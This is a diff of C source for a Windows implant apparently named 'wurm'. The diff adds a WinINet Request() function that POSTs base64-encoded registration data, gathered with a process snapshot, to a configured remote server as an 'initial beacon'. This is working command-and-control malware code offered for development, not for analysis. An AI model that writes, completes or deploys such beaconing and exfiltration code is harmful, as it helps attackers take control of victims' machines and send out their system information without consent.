@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <wincrypt.h>
+#include <wininet.h>
 #include <tlhelp32.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -34,9 +35,11 @@ struct {
 } wurm;
 
 void Encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
+    // Allocate memory and store length of data
     DWORD encoded_data_length = strlen(data_to_encode) * 2;
     wurm.data.encode = (CHAR*) malloc(encoded_data_length);
     
+    // Encrypt data, this can be any encrpytion function as long as it returns a pointer to wurm.data.encode
     CryptBinaryToStringA((BYTE *) data_to_encode, data_to_encode_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, wurm.data.encode, &encoded_data_length);
 }
 
@@ -70,6 +73,46 @@ void Package(CHAR* buffer) {
 
     // Clean up memory
     free(buffer);
+}
+
+void Request() {
+    // Set local variables
+    HINTERNET hInternet; // Must be closed
+    HINTERNET hConnect; // Must be closed
+    HINTERNET hRequest; // Must be closed
+    DWORD dw_error = GetLastError();
+
+    // Set handle to initialize wininet functions
+    hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (hInternet == NULL) {
+        printf("Error: %lu\n", dw_error);
+    }
+
+    // Set handle to connect to specified address and port
+    hConnect = InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
+    if (hConnect == NULL) {
+        printf("Error: %lu\n", dw_error);
+    }
+
+    // Set handle to store a request to be sent
+    hRequest = HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
+    if (hRequest == NULL) {
+        printf("Error: %lu\n", dw_error);
+    }
+
+    // Add request headers and send previously stored request handle
+    if (hInternet != NULL && hConnect != NULL && hRequest != NULL) {
+        HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD); // Set content-length header 
+        HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size);
+    } else {
+        printf("Error: %lu\n", dw_error);
+    }
+
+    // Clean up memory and handles
+    free(wurm.data.buffer);
+    InternetCloseHandle(hInternet);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hRequest);
 }
 
 void Register() {
@@ -154,11 +197,13 @@ void Register() {
     CHAR* buffer = wurm.data.encode; // Note: wurm.data.encode does not need to be freed because it is buffer is pointing its allocation from it.
     Package(buffer);
 
+    // Send request to server
+    Request();
+
     // Clean up memory and handles
     CloseHandle(snapshot);
     free(data_pointer);
     free(wurm.info.name); // Strdup requires variable to be freed
-    free(wurm.data.buffer); // Note: Move to request function once refactored
 }
 
 int main(int argc, char* argv[]) {
@@ -190,4 +235,5 @@ int main(int argc, char* argv[]) {
     // Attempt initial beacon with registration data
     // Note: To properly send a beacon, a format and status must be set, data must be encoded and stored, then a buffer must be set along with its size and length 
     Register();
+    printf("All done!");
 }
